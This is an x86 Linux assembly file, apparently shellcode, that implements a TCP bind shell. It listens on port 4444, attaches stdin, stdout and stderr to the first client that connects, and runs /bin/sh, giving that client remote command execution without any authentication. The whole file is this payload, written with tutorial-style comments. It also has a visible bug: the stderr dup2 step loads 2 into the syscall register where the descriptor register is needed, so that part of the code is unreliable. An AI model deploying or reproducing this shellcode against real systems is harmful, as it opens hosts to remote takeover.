; Filename: bind_tcp.nasm
global _start
section .text
_start:

	; int socket(int domain, int type, int protocol)

	xor eax, eax		  ; zero out eax register
	xor ebx, ebx		  ; zero out ebx register
	xor edx, edx 		  ; zero out edx register

	mov al, 102 		  ; syscall 102 - socketcall 
	mov bl, 1             ; socketcall type (sys_socket 1)

	; socket arguments 
	push edx              ; IPPROTO_IP = 0
	push 1                ; SOCK_STREAM = 1 
	push 2                ; AF_INET = 2 
  
	mov ecx, esp          ; pointer to argument array
	int 0x80              ; kernel interrupt

	mov esi, eax          ; saving return socket file descriptor

    ; Port reuse to avoid issues when using the port multiple times 
    ; setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &socklen_t, socklen_t) 

	xor eax, eax		  ; zero out eax register
	xor ebx, ebx		  ; zero out ebx register
	xor edx, edx		  ; zero out edx register

    mov al, 102		      ; syscall 102 - socketcall
    mov bl, 14            ; socketcall type (sys_setsockopt 14)

    push 4                ; sizeof socklen_t
    push esp              ; address of socklen_t - on the stack
    push 2                ; SO_REUSEADDR = 2
    push 1                ; SOL_SOCKET = 1
    push esi              ; sockfd

    mov ecx, esp 		  ; pointer to argument array

    int 0x80              ; kernel interrupt

    ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)

	xor eax, eax		  ; zero out eax register
	xor ebx, ebx		  ; zero out ebx register
	xor edx, edx		  ; zero out edx register

	mov al, 102           ; syscall 102 - socketcall 
	mov bl, 2             ; socketcall type (sys_bind 2)

	; building the sockaddr_in (recall that it's in reverse to the struct)
	push edx              ; INADDR_ANY = 0 
	push WORD 0x5c11      ; port = 4444 
	push WORD 2           ; AF_INET = 2 

	mov ecx, esp          ; structure pointer (sockaddr_in)


	; bind arguments 
	push 16               ; sockaddr struct size 
	push ecx              ; sockaddr_in struct pointer
	push esi              ; socket fd 

	mov ecx, esp          ; pointer to argument array

	int 0x80              ; kernel interrupt       


	; int listen(int sockfd, int backlog); ; listen(sockfd, 0)

	xor eax, eax		  ; zero out eax register
	xor ebx, ebx		  ; zero out ebx register
	xor edx, edx		  ; zero out edx register

	mov al, 102           ; syscall 102 - socketcall 
	mov bl, 4             ; socketcall type (sys_listen 4)


	push edx              ; backlog (connections queue size) 
	push esi              ; socket fd

	mov ecx, esp          ; pointer to argument array

	int 0x80              ; kernel interrupt


	; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)

	xor eax, eax		  ; zero out eax register
	xor ebx, ebx		  ; zero out ebx register
	xor edx, edx		  ; zero out edx register

	mov al, 102           ; syscall 102 - socketcall
	mov bl, 5             ; socketcall type (sys_accept 5)


	push edx              ; NULL we want to accept all connections (client)     
	push edx              ; NULL we want to accept all connections (client)                   
	push esi              ; socket file descriptor

	mov ecx, esp     	  ; pointer to argument array
	      
	int 0x80              ; kernel interrupt  

	mov esi, eax       	  ; saving returned socket file descriptor of client    


	; int dup2(int oldfd, int newfd)
	; copy 3 file descriptors (stdin,stdout,stderr)

	xor eax, eax		  ; zero out eax register
	xor ebx, ebx		  ; zero out ebx register
	xor edx, edx		  ; zero out edx register

	mov al, 63            ; syscall 63 - dup2 
	mov ebx, esi   		  ; old file descriptor (client socket fd)
	xor ecx, ecx          ; standard input

	int 0x80              ; kernel interrupt

	mov al, 63			  ; syscall 63 dup2
	mov cl, 1             ; standard output
	int 0x80			  ; kernel interrupt

	mov al, 63            ; syscall dup2
	mov al, 2             ; standard error
	int 0x80 			  ; kernel interrupt


	; int execve(const char *filename, char *const argv[], char *const envp[])

	xor eax, eax		  ; zero out eax register
	push eax              ; PUSH the first null dword

	; PUSH /bin//sh (8 bytes) in reverse 

	push 0x68732f2f		  ; hs//
	push 0x6e69622f		  ; nib/

	mov ebx, esp 		  ; EBX points to //bin/sh on the stack using ESP

	push eax              ; push null dword to the stack
	mov edx, esp          ; point edx of argv[] to esp

	; push address of //bin/sh on stack and make ecx points to it using ESP 
	push ebx
	mov ecx, esp

	mov al, 11            ; execve syscall

	int 0x80              ; kernel interrupt